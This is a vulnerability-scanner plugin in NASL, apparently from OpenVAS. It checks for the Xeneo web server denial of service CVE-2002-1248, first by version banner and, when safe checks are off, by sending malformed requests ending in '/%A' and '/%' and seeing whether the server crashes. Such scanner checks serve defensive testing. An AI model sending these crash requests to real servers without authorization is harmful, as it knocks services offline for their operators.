if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11546" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 6098 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2002-1248" );
	script_name( "Xeneo web server %A DoS" );
	script_category( ACT_MIXED_ATTACK );
	script_copyright( "Copyright (C) 2003 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Xeneo/banner" );
	script_tag( name: "solution", value: "Upgrade to Xeneo 2.2.10 or later." );
	script_tag( name: "summary", value: "It was possible to crash the remote
  Xeneo web server by requesting a malformed URL ending
  with /%A or /%" );
	script_tag( name: "qod_type", value: "remote_banner" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
b = http_get_remote_headers( port: port );
if(!b || !ContainsString( b, "Xeneo/" )){
	exit( 0 );
}
if(safe_checks()){
	if(IsMatchRegexp( b, "Server: *Xeneo/2\\.(([01][ \t\r\n.])|(2(\\.[0-9])?[ \t\r\n]))" )){
		security_message( port: port );
		exit( 0 );
	}
	exit( 99 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
for item in make_list( "/%A",
	 "/%" ) {
	data = http_get( item: item, port: port );
	send( socket: soc, data: data );
	r = http_recv( socket: soc );
	http_close_socket( soc );
	if(http_is_dead( port: port )){
		security_message( port: port );
		exit( 0 );
	}
	soc = http_open_socket( port );
	if(!soc){
		exit( 0 );
	}
}
exit( 99 );

